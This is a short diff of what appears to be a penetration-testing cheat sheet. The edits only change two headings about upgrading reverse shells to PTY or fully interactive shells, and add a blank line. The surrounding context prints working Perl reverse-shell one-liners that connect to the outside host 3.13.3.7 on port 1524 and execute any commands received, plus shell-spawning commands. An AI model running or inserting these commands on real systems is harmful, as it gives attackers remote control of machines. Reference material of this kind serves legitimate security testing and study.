@@ -350,7 +350,7 @@ $ perl -e 'use Socket;$i="3.13.3.7";$p=1524;socket(S,PF_INET,SOCK_STREAM,getprot
 $ perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"3.13.3.7:1524");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
 ```
 
-**26. Upgrade a dumb shell to a pty shell**
+**26. Upgrade a reverse shell to a pty shell**
 
 Any of the above reverse shells are limited. For example *sudo bash* or *top* will not work. To make these work we have to upgrate the shell to a real PTY shell:
 
@@ -365,7 +365,7 @@ perl -e 'exec "/bin/bash";'
 awk 'BEGIN {system("/bin/bash")}'
 ```
 
-**27. Upgrade a dumb shell to a fully interactive shell with Python and stty**
+**27. Upgrade a reverse shell to a fully interactive shell**
 
 ...and if we also like to use Ctrl-C we have to go all the way and upgrade the reverse shell to a real fully colorfull interactive shell:
 
@@ -388,6 +388,7 @@ $ stty rows 24 columns 80
 ```
 
 **28. Reverse shell with socat (fully interactive)**
+
 ...or install socat and get it done without much fiddling about:
 
 ```
